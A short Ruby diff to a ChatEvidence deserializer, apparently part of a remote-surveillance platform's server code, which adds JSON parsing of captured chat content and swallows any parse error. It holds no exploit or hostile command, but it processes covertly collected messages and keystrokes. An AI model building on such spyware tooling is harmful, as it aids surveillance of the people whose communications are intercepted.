@@ -1,5 +1,7 @@
 # encoding: utf-8
 
+require 'json'
+
 require 'rcs-common/trace'
 require 'rcs-common/evidence/common'
 
@@ -58,8 +60,13 @@ module ChatEvidence
       #trace :info, "CHAT Users #{info[:data][:users]}"
       keystrokes = stream.read_utf16le_string
       info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
-      #trace :info, "CHAT Content #{info[:data][:content]}"
-
+      
+      begin
+        info[:data][:content] = JSON.parse info[:data][:content]
+      rescue Exception => e
+        # leave content as is
+      end
+      
       delim = stream.read(4).unpack("L*").first
       raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER
 
